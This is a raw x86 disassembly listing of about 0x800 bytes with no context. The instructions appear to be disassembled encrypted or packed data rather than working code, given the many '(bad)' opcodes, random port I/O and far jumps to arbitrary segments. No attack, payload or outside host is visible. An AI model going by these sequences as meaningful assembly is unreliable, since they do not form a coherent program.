  41904d:	cmp    ecx,DWORD PTR [eax+esi*2+0x4769ed92]
  419054:	jle    0x41901b
  419056:	or     esi,ecx
  419058:	je     0x4190bb
  41905a:	mov    cs:0xf14a12,eax
  419060:	out    0x63,al
  419062:	fild   DWORD PTR [edx]
  419064:	pop    esp
  419065:	ja     0x41908f
  419067:	mov    bl,0xe2
  419069:	outs   dx,DWORD PTR ds:[esi]
  41906a:	addr16 or cl,ah
  41906d:	(bad)  
  41906e:	pop    esi
  41906f:	jb     0x4190e7
  419071:	out    dx,eax
  419072:	inc    edi
  419073:	je     0x4190e0
  419075:	(bad)  
  419077:	pop    ebp
  419078:	mov    dh,0xcb
  41907a:	test   DWORD PTR ss:[si-0x2a],edi
  41907f:	retf   
  419080:	pop    ebx
  419081:	pop    esi
  419082:	imul   edx,DWORD PTR [esi],0x3e
  419085:	mov    ebx,0x863895bf
  41908a:	pop    ss
  41908b:	out    dx,al
  41908c:	fs enter 0x5ec6,0x10
  419091:	enter  0xcab8,0xf3
  419095:	inc    esi
  419096:	xchg   ebp,eax
  419097:	shr    BYTE PTR [ebx],1
  419099:	ins    DWORD PTR es:[edi],dx
  41909a:	xchg   DWORD PTR [eax-0x68],eax
  41909d:	mov    dl,0x85
  41909f:	push   ebp
  4190a0:	shl    edi,cl
  4190a2:	mov    cl,0xfe
  4190a4:	push   ecx
  4190a5:	test   eax,0xef6b7171
  4190aa:	inc    ebx
  4190ab:	out    dx,eax
  4190ac:	jp     0x4190d4
  4190ae:	mov    dh,cl
  4190b0:	ins    BYTE PTR es:[edi],dx
  4190b1:	xor    BYTE PTR [edx+0x322728f1],ch
  4190b7:	mov    ds:0x185cfe55,eax
  4190bc:	fs inc edx
  4190be:	xchg   ebp,eax
  4190bf:	in     al,dx
  4190c0:	add    DWORD PTR [ebp+0xf],esp
  4190c3:	adc    al,0x3
  4190c5:	mov    edx,0xa98c3514
  4190ca:	jle    0x419084
  4190cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190cd:	int    0xdb
  4190cf:	jb     0x4190a2
  4190d1:	out    dx,eax
  4190d2:	ds mov ch,0xf0
  4190d5:	lahf   
  4190d6:	push   0x3f80b31f
  4190db:	xor    BYTE PTR [eax],0xb0
  4190de:	pop    edx
  4190df:	cmp    al,0x81
  4190e1:	adc    DWORD PTR [eax+edx*4],0xffffff8c
  4190e5:	mov    BYTE PTR [edx+0x2],bh
  4190e8:	push   eax
  4190e9:	cld    
  4190ea:	jp     0x41915e
  4190ec:	inc    edx
  4190ed:	sbb    al,0x4e
  4190ef:	push   ss
  4190f0:	mov    ch,0x99
  4190f2:	mov    ecx,0xd09729ef
  4190f7:	mov    bl,BYTE PTR [edi-0x4]
  4190fa:	xor    ecx,DWORD PTR [edi]
  4190fc:	fs xchg edi,eax
  4190fe:	push   eax
  4190ff:	cwde   
  419100:	bound  esi,QWORD PTR [esi+0x7a]
  419103:	(bad)  
  419104:	mov    cl,0xc3
  419106:	loopne 0x4190c6
  419108:	jb     0x419142
  41910a:	and    dl,cl
  41910c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41910d:	mov    eax,DWORD PTR [eiz*4-0x4b7ad273]
  419114:	ret    0x1c86
  419117:	cmp    eax,0x2e6a91c9
  41911c:	in     al,dx
  41911d:	(bad)  [esi-0x6]
  419120:	pop    eax
  419121:	(bad)  
  419122:	and    ebx,DWORD PTR [ecx+0x11f0ef09]
  419128:	fs dec ebp
  41912a:	inc    esi
  41912b:	sahf   
  41912c:	jb     0x419126
  41912e:	ror    DWORD PTR [edx],cl
  419130:	aam    0x16
  419132:	pop    ebp
  419133:	push   cs
  419134:	(bad)  
  419135:	aam    0x6d
  419137:	mov    edi,0xa91768af
  41913c:	pop    eax
  41913d:	sub    BYTE PTR [esi],bh
  41913f:	pop    ebx
  419140:	push   edx
  419142:	mov    ebp,0xea9a729b
  419147:	push   edi
  419148:	mov    al,es:0x44c8e041
  41914e:	cwde   
  41914f:	sub    dh,cl
  419151:	jmp    0x419153
  419153:	dec    esi
  419154:	adc    ebp,ebp
  419156:	mov    bh,0xdc
  419158:	mov    ch,0xbd
  41915a:	les    esi,FWORD PTR [ecx]
  41915c:	mov    cl,0xe8
  41915e:	adc    ecx,edi
  419160:	(bad)  
  419161:	aad    0x33
  419163:	ins    DWORD PTR es:[edi],dx
  419164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419165:	mov    ah,ah
  419167:	sub    ch,BYTE PTR [ecx-0x4b]
  41916a:	jb     0x4191c9
  41916c:	jmp    0x4191d4
  41916e:	and    ch,al
  419170:	pop    ebx
  419171:	retf   0x5b3d
  419174:	into   
  419175:	(bad)  
  419176:	push   cs
  419177:	ds jns 0x4191ef
  41917a:	daa    
  41917b:	in     eax,0x96
  41917d:	dec    ebx
  41917e:	dec    eax
  41917f:	or     eax,0x4e7b80cb
  419184:	mov    dh,0xe0
  419186:	mov    ah,0x3d
  419188:	cmp    al,0x92
  41918a:	dec    edi
  41918b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41918c:	fisub  WORD PTR [esi-0x54]
  41918f:	mov    edx,0x79dc266e
  419194:	sbb    BYTE PTR [ecx+0x54],dh
  419197:	xchg   edi,eax
  419198:	sbb    eax,0x31dd80d4
  41919d:	jbe    0x419158
  41919f:	adc    DWORD PTR [eax-0x5b],0x59c2aa86
  4191a6:	jge    0x419135
  4191a8:	jp     0x4191e9
  4191aa:	or     DWORD PTR [edi],edi
  4191ac:	mov    ds:0xd05d7622,eax
  4191b1:	call   0x9d5b:0x2a904737
  4191b8:	repnz or DWORD PTR [ebx],ebp
  4191bb:	and    BYTE PTR [esp+0x6e],0xcc
  4191c0:	fucomi st,st(7)
  4191c2:	cwde   
  4191c3:	aad    0x4a
  4191c5:	mov    al,0x5d
  4191c7:	lods   eax,DWORD PTR ds:[esi]
  4191c8:	test   al,0x63
  4191ca:	pop    ecx
  4191cb:	outs   dx,DWORD PTR gs:[esi]
  4191cd:	mov    al,ch
  4191cf:	inc    eax
  4191d0:	pop    edx
  4191d1:	jmp    0x3abc:0xb1b5763c
  4191d8:	or     BYTE PTR [ebx-0x5628a3a3],0x87
  4191df:	(bad)  
  4191e0:	aaa    
  4191e1:	in     al,dx
  4191e2:	in     al,dx
  4191e3:	repnz sub dl,BYTE PTR [ebp-0x5164c07]
  4191ea:	test   BYTE PTR [esi-0x5b664f23],dl
  4191f0:	sub    edi,edi
  4191f2:	xor    BYTE PTR [ecx+0x75a80b21],bl
  4191f8:	inc    edx
  4191f9:	sub    DWORD PTR [ecx+0x7b49e340],0x1b7a188b
  419203:	aam    0x57
  419205:	mov    dh,0x23
  419207:	ficomp WORD PTR [ebp+0x1bb295ac]
  41920d:	sub    BYTE PTR [esi+edi*8],dh
  419210:	push   eax
  419211:	inc    eax
  419212:	push   cs
  419213:	stos   DWORD PTR es:[edi],eax
  419214:	(bad)  
  419215:	xor    DWORD PTR [edi],ebx
  419217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419218:	xor    esi,DWORD PTR [esi+0x11]
  41921b:	jne    0x419294
  41921d:	jmp    0xc4423ba9
  419222:	stc    
  419223:	mov    bh,0xfa
  419225:	(bad)  
  419228:	push   eax
  419229:	sbb    al,0x89
  41922b:	adc    esp,edx
  41922d:	xor    BYTE PTR [edx],cl
  41922f:	test   ecx,esp
  419231:	fild   WORD PTR [eax+eax*2-0x55]
  419235:	test   ebx,edi
  419237:	(bad)  
  419239:	mov    ds:0x4a91e999,eax
  41923e:	lods   al,BYTE PTR ds:[esi]
  41923f:	daa    
  419240:	in     eax,dx
  419241:	add    DWORD PTR [edi-0x32],edi
  419244:	jg     0x41922e
  419246:	jmp    0x3f22:0x4fb5f2ab
  41924d:	jbe    0x419266
  41924f:	and    al,0x7f
  419251:	je     0x41924b
  419253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419254:	loope  0x4192bd
  419256:	sub    esi,esi
  419258:	clc    
  419259:	push   0x72
  41925b:	jne    0x419298
  41925d:	ss adc al,0x96
  419260:	out    dx,eax
  419261:	scas   al,BYTE PTR es:[edi]
  419262:	inc    esp
  419263:	adc    DWORD PTR [ecx+ebp*2+0x23dc25da],edx
  41926a:	adc    eax,0xaca867d4
  41926f:	sub    cl,bh
  419271:	ds xchg ebp,eax
  419273:	push   0xffffffc3
  419275:	xor    DWORD PTR [ebp-0x52],edi
  419278:	mov    ds:0xdabfb9ea,eax
  41927d:	mov    al,ds:0xac8f5213
  419282:	cld    
  419283:	xchg   esi,eax
  419284:	mov    edx,0x1372f901
  419289:	jecxz  0x4192f8
  41928b:	iret   
  41928c:	sbb    eax,0xf68e087a
  419291:	sub    esp,DWORD PTR [esi]
  419293:	jmp    0xd3ea9
  419298:	std    
  419299:	jl     0x41930b
  41929b:	pop    ecx
  41929c:	sub    DWORD PTR [esi],ecx
  41929e:	ins    DWORD PTR es:[edi],dx
  41929f:	mov    esi,0x9e34411e
  4192a4:	jae    0x419232
  4192a6:	push   ss
  4192a7:	sub    eax,0xf10bae4d
  4192ac:	jge    0x4192df
  4192ae:	(bad)  
  4192b0:	jecxz  0x419319
  4192b2:	lods   eax,DWORD PTR ds:[esi]
  4192b3:	add    edi,DWORD PTR [ecx+0x60]
  4192b6:	push   ebx
  4192b7:	cmp    eax,0x3d67d3a5
  4192bc:	sbb    al,0x63
  4192be:	mov    eax,0x556b638d
  4192c3:	ss push edx
  4192c5:	pop    ebx
  4192c6:	(bad)  
  4192c7:	and    edx,DWORD PTR [ecx]
  4192c9:	fadd   DWORD PTR [edx-0x3ea3cea2]
  4192d0:	pop    esi
  4192d1:	pop    ecx
  4192d2:	and    BYTE PTR [esi+ebp*1-0x32],ch
  4192d6:	bound  esp,QWORD PTR [eax+0x34]
  4192d9:	fwait
  4192da:	lods   eax,DWORD PTR ds:[esi]
  4192db:	push   0x21
  4192dd:	daa    
  4192de:	repz out 0x4f,al
  4192e1:	or     DWORD PTR [ecx],ecx
  4192e3:	inc    DWORD PTR [eax]
  4192e5:	into   
  4192e6:	mov    esp,0xf9e8da12
  4192eb:	cs mov esp,0xdb1b1240
  4192f1:	xlat   BYTE PTR ds:[ebx]
  4192f2:	push   cs
  4192f3:	mov    ch,0x95
  4192f5:	pop    ss
  4192f6:	and    eax,0x9c16d047
  4192fb:	mov    al,0xda
  4192fd:	aaa    
  4192fe:	bound  ebx,QWORD PTR [edx-0x12a69c03]
  419304:	mov    BYTE PTR [ebx+0x661d9bf3],bl
  41930a:	in     eax,dx
  41930b:	jno    0x41935e
  41930d:	arpl   WORD PTR fs:[ecx],cx
  419310:	cmp    al,0x76
  419312:	add    DWORD PTR [ebx+0x7d],edi
  419315:	lods   eax,DWORD PTR ds:[esi]
  419316:	sub    esp,eax
  419318:	loopne 0x4192e3
  41931a:	dec    edx
  41931b:	test   eax,0x819fee1b
  419320:	jmp    0xeee02988
  419325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419326:	inc    eax
  419327:	sub    eax,0x7f9890f5
  41932c:	les    edx,FWORD PTR ds:0x2c0e4a2c
  419332:	lods   eax,DWORD PTR ds:[esi]
  419333:	or     eax,0x10ff5e1a
  419338:	cld    
  419339:	pop    edi
  41933a:	jmp    0xa27585b2
  41933f:	aas    
  419340:	std    
  419341:	push   0xffffffa7
  419343:	pop    ss
  419344:	(bad)  
  419345:	mov    ds:0x7b839894,al
  41934a:	lahf   
  41934b:	ret    0x768b
  41934e:	dec    ecx
  41934f:	and    eax,0xcf4ac48
  419354:	fidivr DWORD PTR [esi-0x68]
  419357:	mov    ah,bl
  419359:	pop    ss
  41935a:	std    
  41935b:	jne    0x4192e8
  41935d:	sahf   
  41935e:	clc    
  41935f:	lahf   
  419360:	or     al,0xeb
  419362:	jbe    0x419383
  419364:	icebp  
  419365:	fist   DWORD PTR [edi+0x5]
  419368:	sub    BYTE PTR [ecx-0x29e9d11b],al
  41936e:	mov    dh,0xde
  419370:	icebp  
  419371:	cmp    BYTE PTR [esi+0x4b8d1dd9],ch
  419377:	pop    eax
  419378:	or     ah,dl
  41937a:	aam    0x36
  41937c:	mov    edx,0x7f045798
  419381:	or     ah,dl
  419383:	mov    ch,0xf0
  419385:	dec    edi
  419386:	jo     0x4193d1
  419388:	add    BYTE PTR [ecx-0x57],0xe9
  41938c:	jns    0x4193d3
  41938e:	jmp    0x7d0b:0x4593519e
  419395:	pop    ebx
  419396:	lds    eax,FWORD PTR [ebx+0x8]
  419399:	cli    
  41939a:	or     BYTE PTR [eax-0x76],bh
  41939d:	xchg   DWORD PTR [edx+0x3f],esi
  4193a0:	shl    ch,cl
  4193a2:	arpl   WORD PTR [eax-0xb1e2a89],sp
  4193a8:	ret    
  4193a9:	test   al,0x73
  4193ab:	into   
  4193ac:	int    0xee
  4193ae:	enter  0x690b,0xed
  4193b2:	cmp    al,0x47
  4193b4:	jbe    0x4193cf
  4193b6:	mov    ss,WORD PTR [edi-0x512ce9ec]
  4193bc:	xchg   dx,ax
  4193be:	retf   0x1c4f
  4193c1:	inc    esp
  4193c2:	outs   dx,BYTE PTR ds:[esi]
  4193c3:	push   edi
  4193c4:	jp     0x419367
  4193c6:	in     eax,0x76
  4193c8:	mov    ch,0x27
  4193ca:	mov    al,0x94
  4193cc:	mov    ?,WORD PTR [edx]
  4193ce:	dec    edi
  4193cf:	add    ebp,ebp
  4193d1:	adc    ebx,DWORD PTR [ebp+0x4d]
  4193d4:	std    
  4193d5:	add    DWORD PTR [esi+esi*4-0x42],0xf135f6a4
  4193dd:	mov    eax,0xfd78996b
  4193e2:	push   ds
  4193e3:	mov    ebx,DWORD PTR [edx]
  4193e5:	sub    dl,BYTE PTR [ebp+0x7167de88]
  4193eb:	loopne 0x4193d9
  4193ed:	fmul   QWORD PTR [ecx-0x7bc70e8e]
  4193f3:	cwd    
  4193f5:	je     0x4193bf
  4193f7:	xor    eax,0x16ed91ea
  4193fc:	pushf  
  4193fd:	idiv   al
  4193ff:	fwait
  419400:	mov    edx,ebx
  419402:	lahf   
  419403:	mov    eax,ds:0x6c115e49
  419408:	je     0x4193b6
  41940a:	sub    al,0x90
  41940c:	fidiv  DWORD PTR [ecx+0x47ad8826]
  419412:	dec    ebx
  419413:	add    eax,0x40bc79ff
  419418:	loopne 0x4193dc
  41941a:	inc    esp
  41941b:	xchg   ecx,eax
  41941c:	ins    BYTE PTR es:[edi],dx
  41941d:	mov    al,0x17
  41941f:	retf   0x4749
  419422:	ret    0x2e10
  419425:	mov    dh,ch
  419427:	imul   esi,DWORD PTR [ebx+edx*8+0x6a],0xa4212d21
  41942f:	and    al,0x65
  419431:	xor    DWORD PTR cs:[ebp-0x66],0x12
  419436:	add    bh,BYTE PTR [eax-0x66]
  419439:	xor    edx,DWORD PTR [eax]
  41943b:	xchg   ebp,eax
  41943c:	daa    
  41943d:	in     eax,dx
  41943e:	push   es
  41943f:	dec    ebx
  419440:	inc    ecx
  419441:	mov    cl,0x85
  419443:	push   0x15
  419445:	ja     0x419471
  419447:	mov    esi,0x1b751313
  41944c:	fstp   st(2)
  41944e:	jbe    0x41949c
  419450:	jbe    0x419413
  419452:	and    dh,BYTE PTR ds:0xcdc84e19
  419458:	push   esp
  419459:	dec    edi
  41945a:	int3   
  41945b:	imul   eax,DWORD PTR [ebp-0x48ffdf06],0x805ff134
  419465:	popf   
  419466:	out    dx,eax
  419467:	dec    esi
  419468:	cwde   
  419469:	nop
  41946a:	call   0xf09ebb68
  41946f:	(bad)  
  419470:	fcmove st,st(7)
  419472:	jo     0x419410
  419474:	push   es
  419475:	push   eax
  419476:	out    dx,eax
  419477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419478:	outs   dx,DWORD PTR ds:[esi]
  419479:	pushf  
  41947a:	jns    0x41940d
  41947c:	xchg   esp,eax
  41947d:	or     eax,0x3d66294b
  419482:	pop    ebx
  419483:	call   0x897b:0xd1d4a565
  41948a:	loopne 0x41943b
  41948c:	(bad)  
  41948d:	cwde   
  41948e:	push   ebx
  41948f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419490:	inc    esp
  419491:	push   ds
  419492:	add    DWORD PTR [esi-0x1],ecx
  419495:	pop    ds
  419496:	xor    ecx,0x5a
  419499:	add    DWORD PTR [ebx+eax*1-0x21997162],edx
  4194a0:	or     eax,0xe71f92f2
  4194a5:	rcr    DWORD PTR [eax+edx*1-0x20d5529],1
  4194ac:	mov    ds:0xcf1cef0c,eax
  4194b1:	xor    eax,0x95a46d1a
  4194b6:	shl    BYTE PTR [ecx-0x17],0x48
  4194ba:	xor    ecx,DWORD PTR ds:0x3452685
  4194c0:	inc    ebp
  4194c1:	jne    0x419474
  4194c3:	xchg   esi,eax
  4194c4:	outs   dx,BYTE PTR ds:[esi]
  4194c5:	repz rol al,0x1d
  4194c9:	ror    ebx,1
  4194cb:	rcr    dh,cl
  4194cd:	lock lods eax,DWORD PTR ds:[esi]
  4194cf:	int3   
  4194d0:	sti    
  4194d1:	retf   
  4194d2:	addr16 sahf 
  4194d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194d5:	les    edx,FWORD PTR [esi-0x75d6f9e]
  4194db:	xchg   ebx,eax
  4194dc:	pop    es
  4194dd:	ret    
  4194de:	pop    ebp
  4194df:	ret    
  4194e0:	push   ds
  4194e1:	ins    BYTE PTR es:[edi],dx
  4194e2:	add    DWORD PTR [esi+0x52],edi
  4194e5:	push   ecx
  4194e6:	fidivr DWORD PTR [ecx-0x27ff02dc]
  4194ec:	pop    es
  4194ed:	repz adc bh,BYTE PTR [esp+eax*4+0x30]
  4194f2:	fisttp WORD PTR [edx+0x3d7f8ae8]
  4194f8:	adc    eax,0x68af1c8f
  4194fd:	sahf   
  4194fe:	(bad)  
  4194ff:	out    dx,eax
  419500:	adc    DWORD PTR [ebx+0x23],eax
  419503:	lahf   
  419504:	les    esp,FWORD PTR [ecx+0x24]
  419507:	adc    DWORD PTR [ebx+edx*8],ebx
  41950a:	fldcw  WORD PTR [ecx]
  41950c:	imul   eax,DWORD PTR [esp+esi*8-0x44],0x3a5655b8
  419514:	(bad)  
  419515:	mov    al,ds:0x931fca7c
  41951a:	fiadd  WORD PTR [edi+ebp*4-0x1187f77d]
  419521:	fadd   DWORD PTR [edx+0x33f010f8]
  419527:	out    0x6a,eax
  419529:	and    al,0xcf
  41952b:	fild   WORD PTR [edx+0x6e]
  41952e:	mov    ds:0xc0872d4d,eax
  419533:	es sbb al,cl
  419536:	gs push ecx
  419538:	test   ebp,eax
  41953a:	jne    0x4194ce
  41953c:	vxorpd zmm5{k5},zmm4,QWORD PTR [ecx]{1to8}
  419542:	mov    DWORD PTR [esi],esi
  419544:	(bad)  
  419545:	cmp    al,0x55
  419547:	ins    BYTE PTR es:[edi],dx
  419548:	out    dx,al
  419549:	fld    QWORD PTR [ecx+0x3f]
  41954c:	add    al,0xec
  41954e:	sbb    bl,BYTE PTR [ebx+edx*8+0x43a7fda8]
  419555:	push   eax
  419556:	add    DWORD PTR ss:[ecx-0x4],edx
  41955a:	aas    
  41955b:	or     al,0xee
  41955d:	outs   dx,DWORD PTR ds:[esi]
  41955e:	test   DWORD PTR [edx-0x7cc02502],eax
  419564:	dec    ecx
  419565:	dec    dx
  419567:	adc    edx,DWORD PTR [ebx+0x36]
  41956a:	ffreep st(7)
  41956c:	inc    BYTE PTR ds:0x38e0a202
  419572:	imul   eax,esp,0x73
  419575:	in     eax,0xaa
  419577:	pop    edx
  419578:	pop    ss
  419579:	shr    DWORD PTR [eax],0xb6
  41957c:	mov    bl,0xa5
  41957e:	sub    BYTE PTR [eax-0x7cbdd065],al
  419584:	pop    ebp
  419585:	mov    ah,0x41
  419587:	inc    edx
  419588:	(bad)  
  419589:	and    BYTE PTR [eax+0x181dad8d],al
  41958f:	div    DWORD PTR [esi+0x537157d9]
  419595:	stos   DWORD PTR es:[edi],eax
  419596:	out    0xf3,al
  419598:	add    al,0x6f
  41959a:	inc    eax
  41959b:	iret   
  41959c:	sbb    BYTE PTR [eax+0x2f],bl
  41959f:	sub    eax,0xcf9fe3d
  4195a4:	int    0xb5
  4195a6:	loopne 0x4195e0
  4195a8:	cmc    
  4195a9:	push   ebp
  4195aa:	into   
  4195ab:	mov    dh,0xbc
  4195ad:	jmp    0x419609
  4195af:	(bad)  [eax-0x440e13f9]
  4195b5:	out    dx,eax
  4195b6:	jmp    0xae15:0x3ba94bcb
  4195bd:	or     eax,0x7d88befb
  4195c2:	iret   
  4195c3:	aam    0xcb
  4195c5:	inc    esp
  4195c6:	inc    esp
  4195c7:	sti    
  4195c8:	into   
  4195c9:	adc    al,BYTE PTR [edx]
  4195cb:	sti    
  4195cc:	aad    0x6d
  4195ce:	shl    BYTE PTR [edx-0x35],cl
  4195d1:	les    edx,FWORD PTR [eax+0x58]
  4195d4:	jg     0x4195ce
  4195d6:	xlat   BYTE PTR ds:[ebx]
  4195d7:	fidivr DWORD PTR [edx+0x30]
  4195da:	mov    ecx,0x11771ed7
  4195df:	sahf   
  4195e0:	cmp    eax,0x9241ed28
  4195e5:	hlt    
  4195e6:	and    al,0xc8
  4195e8:	adc    DWORD PTR [edi],esp
  4195ea:	inc    ebx
  4195eb:	inc    ebx
  4195ec:	popa   
  4195ed:	xchg   edi,eax
  4195ee:	or     DWORD PTR [ebx+0x19],esp
  4195f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195f2:	test   edi,edi
  4195f4:	stos   BYTE PTR es:[edi],al
  4195f5:	and    eax,0x6c3293ac
  4195fa:	mov    ds:0xbf26fd77,al
  4195ff:	call   0xc52f48d9
  419604:	int    0xf8
  419606:	jge    0x419669
  419608:	popa   
  419609:	fcom   QWORD PTR [edx+0x7d8a3bf4]
  41960f:	xor    ecx,DWORD PTR [edi-0x5494b7cf]
  419615:	or     eax,0x10109560
  41961a:	jl     0x419646
  41961c:	dec    esi
  41961d:	es jge 0x41968f
  419620:	inc    esp
  419621:	cmc    
  419622:	test   bh,0x1b
  419625:	add    DWORD PTR [ebx],esi
  419627:	sub    eax,0xc2ef8c58
  41962c:	stos   BYTE PTR es:[edi],al
  41962d:	add    al,BYTE PTR [edx]
  41962f:	cwde   
  419630:	lods   al,BYTE PTR ds:[esi]
  419631:	inc    ebp
  419632:	sub    al,0xe7
  419634:	loope  0x419619
  419636:	loopne 0x4196ab
  419638:	rcr    BYTE PTR [edi],cl
  41963a:	test   BYTE PTR [eax-0x48],ch
  41963d:	jge    0x41965b
  41963f:	inc    ecx
  419640:	mov    esi,0xaf955da0
  419645:	ss aaa 
  419647:	push   ds
  419648:	mov    esp,0x9bfd7096
  41964d:	dec    eax
  41964e:	cmp    ah,bl
  419650:	test   al,0x1d
  419652:	ins    DWORD PTR es:[edi],dx
  419653:	mov    edx,0x4fe5f67b
  419658:	xor    al,0x8f
  41965a:	add    al,0x36
  41965c:	arpl   WORD PTR [eax],cx
  41965e:	pop    esp
  41965f:	lods   al,BYTE PTR ds:[esi]
  419660:	push   0xc44f00e7
  419665:	sbb    ebx,eax
  419667:	int3   
  419668:	or     eax,0x647abba6
  41966d:	lea    eax,es:[bx+di]
  419671:	xor    ch,BYTE PTR [ebp-0x26437772]
  419677:	(bad)  
  419678:	ja     0x4195fb
  41967a:	in     eax,dx
  41967b:	inc    esp
  41967c:	cmp    ch,BYTE PTR ds:0x91f47538
  419682:	mov    esp,0x629b6dee
  419687:	adc    al,0x48
  419689:	pushf  
  41968a:	popa   
  41968b:	ins    BYTE PTR es:[edi],dx
  41968c:	aam    0x56
  41968e:	mov    ebp,DWORD PTR ds:0xe81e9a49
  419694:	and    eax,0x9d5c3c9b
  419699:	loope  0x41961f
  41969b:	and    esi,DWORD PTR [edi+0x6d5236b3]
  4196a1:	dec    ebx
  4196a2:	sbb    eax,0x4babc7d2
  4196a7:	mov    ah,0x56
  4196a9:	jno    0x419692
  4196ab:	sbb    BYTE PTR [eax+eiz*4],al
  4196ae:	inc    ebp
  4196af:	cwde   
  4196b0:	in     eax,0xe2
  4196b2:	inc    edi
  4196b3:	push   ecx
  4196b4:	pop    esi
  4196b5:	aad    0x37
  4196b7:	(bad)  
  4196b8:	adc    DWORD PTR [ebx-0x1f0cc1a0],ebx
  4196be:	mov    ch,0x73
  4196c0:	xor    DWORD PTR [edi+0x66],esi
  4196c3:	aam    0x15
  4196c5:	stc    
  4196c6:	mov    edi,esp
  4196c8:	lea    ebx,[esi+eax*1-0x7e]
  4196cc:	in     eax,0x93
  4196ce:	inc    edi
  4196cf:	(bad)  
  4196d1:	jle    0x4196f0
  4196d3:	test   DWORD PTR [ebx+eax*2+0x9],ecx
  4196d7:	and    al,dl
  4196d9:	jne    0x4196c5
  4196db:	(bad)  
  4196dc:	scas   eax,DWORD PTR es:[edi]
  4196dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196de:	push   cs
  4196df:	xchg   ebx,eax
  4196e0:	enter  0xd2eb,0xe6
  4196e4:	ja     0x419678
  4196e6:	daa    
  4196e7:	inc    edx
  4196e8:	push   esi
  4196e9:	test   ebx,ebx
  4196eb:	sub    DWORD PTR [ecx+0x66],0xa21b278c
  4196f2:	and    esp,DWORD PTR [edx]
  4196f4:	aaa    
  4196f5:	div    BYTE PTR [ebp+0x47839589]
  4196fb:	(bad)  
  4196fc:	mov    ebp,0xba2508b4
  419701:	cmp    al,0x4a
  419703:	and    bh,BYTE PTR ds:0xbd9b082d
  419709:	test   eax,0xf5c893bb
  41970e:	out    dx,al
  41970f:	or     BYTE PTR [edx+eax*1-0x2c],ch
  419713:	sbb    DWORD PTR [ebp+0x4397b7a0],edx
  419719:	call   0xa3d9:0x13cff0da
  419720:	(bad)  
  419721:	adc    eax,0x45f66f3d
  419726:	sub    DWORD PTR [ebx-0x45],0xffffffbe
  41972a:	xor    edx,DWORD PTR [ebp-0x23af4111]
  419730:	outs   dx,DWORD PTR ds:[esi]
  419731:	mov    dl,cl
  419733:	sub    BYTE PTR [esi-0x2dc5d8c0],0x40
  41973a:	ror    DWORD PTR ds:0xf5c13180,0xb3
  419741:	or     eax,0x33038902
  419746:	cld    
  419747:	inc    edi
  419748:	fisub  DWORD PTR [ecx]
  41974a:	mov    edx,0x9c28d59c
  41974f:	xchg   edi,eax
  419750:	and    ebx,DWORD PTR gs:[ebx]
  419753:	mov    ecx,0x1db9f7fd
  419758:	cmp    esi,ecx
  41975a:	dec    ebx
  41975b:	std    
  41975c:	ret    
  41975d:	inc    esi
  41975e:	daa    
  41975f:	rcr    BYTE PTR [eax+0x14],0xf9
  419763:	ficomp DWORD PTR [eax+0x1d333ff]
  419769:	rcl    BYTE PTR [ebx],0x17
  41976c:	cmp    esi,DWORD PTR [ebp+0x483aa4c0]
  419772:	aas    
  419773:	or     BYTE PTR [ebp-0x32],0x2f
  419777:	lods   al,BYTE PTR ds:[esi]
  419778:	pop    ds
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	lds    esi,FWORD PTR [edx]
  41977c:	arpl   WORD PTR [edx+0x52],sp
  41977f:	xor    al,BYTE PTR [ecx+esi*2]
  419782:	jnp    0x41972e
  419784:	mov    dh,0xe1
  419786:	(bad)  
  419787:	repnz and edi,ebp
  41978a:	scas   eax,DWORD PTR es:[edi]
  41978b:	fistp  QWORD PTR [ebp+0x23]
  41978e:	cmp    BYTE PTR [esi-0x78641f2c],0x62
  419795:	adc    eax,0xbc553626
  41979a:	adc    DWORD PTR ds:0xa02b9987,esp
  4197a0:	inc    esi
  4197a1:	bound  ecx,QWORD PTR [edi+ebx*4]
  4197a4:	mov    al,0xf7
  4197a6:	sub    al,0x7
  4197a8:	pop    esi
  4197a9:	bound  edx,QWORD PTR ds:0xedc75e9f
  4197af:	mov    edi,?
  4197b1:	popf   
  4197b2:	mov    DWORD PTR [edx+ebp*2-0x40],edx
  4197b6:	inc    esp
  4197b7:	mov    edx,0xf61804fa
  4197bc:	inc    eax
  4197bd:	and    ch,ch
  4197bf:	inc    ecx
  4197c0:	jl     0x4197f5
  4197c2:	pop    ss
  4197c3:	dec    esi
  4197c4:	(bad)  
  4197c5:	push   ebp
  4197c6:	ins    DWORD PTR es:[edi],dx
  4197c7:	ins    BYTE PTR es:[edi],dx
  4197c8:	sbb    BYTE PTR [ecx+edx*1+0x7cd872b0],bl
  4197cf:	test   edi,esp
  4197d1:	enter  0xa333,0x32
  4197d5:	jnp    0x4197eb
  4197d7:	out    0xa2,al
  4197d9:	adc    al,0xe5
  4197db:	call   0x63e4:0x7d860064
  4197e2:	clc    
  4197e3:	scas   eax,DWORD PTR es:[edi]
  4197e4:	retf   
  4197e5:	popf   
  4197e6:	sub    esp,DWORD PTR [edi]
  4197e8:	or     al,0x18
  4197ea:	lods   eax,DWORD PTR ds:[esi]
  4197eb:	and    BYTE PTR [eax+0x42],bh
  4197ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197ef:	mov    al,ds:0xf706928
  4197f4:	jnp    0x4197aa
  4197f6:	xor    al,0x42
  4197f8:	xor    esp,esi
  4197fa:	mov    ebx,0x6c796a35
  4197ff:	jnp    0x4197ae
  419801:	retf   0xf6c7
  419804:	test   al,0x26
  419806:	test   eax,0xf07db40f
  41980b:	test   eax,0x90c33fb
  419810:	jae    0x419850
  419812:	pop    ecx
  419813:	test   DWORD PTR [esp+edx*1+0x24],ebx
  419817:	adc    esi,ecx
  419819:	and    edi,DWORD PTR [eax+0x2d]
  41981c:	sbb    edx,edi
  41981e:	adc    DWORD PTR [esi+0x7492e6fb],ebx
  419824:	out    dx,al
  419825:	add    edi,DWORD PTR [edi+0x5b74feda]
  41982b:	ins    DWORD PTR es:[edi],dx
